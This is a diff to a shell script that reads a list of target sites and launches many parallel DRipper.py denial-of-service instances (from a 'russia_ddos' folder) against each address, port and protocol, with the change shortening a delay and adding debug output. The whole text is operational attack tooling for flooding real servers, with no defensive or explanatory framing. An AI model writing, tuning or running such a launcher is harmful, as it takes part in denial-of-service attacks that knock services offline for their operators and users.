@@ -49,7 +49,7 @@ do
              echo $site
    done
    echo -e "\n"
-   sleep 10
+   sleep 3
    
    # Launch multiple DRipper.py instances
    for i in $random_numbers
@@ -60,7 +60,9 @@ do
              addr=$(echo $site | awk '{print $1}')
              port=$(echo $site | awk '{print $2}')
              prot=$(echo $site | awk '{print $3}')
-
+    echo $site
+    echo $addr $port $prot
+    sleep 2
              python3 -u ~/russia_ddos/DRipper.py -l 2048 -s $addr -p $port -m $prot -t 50&
    done
    
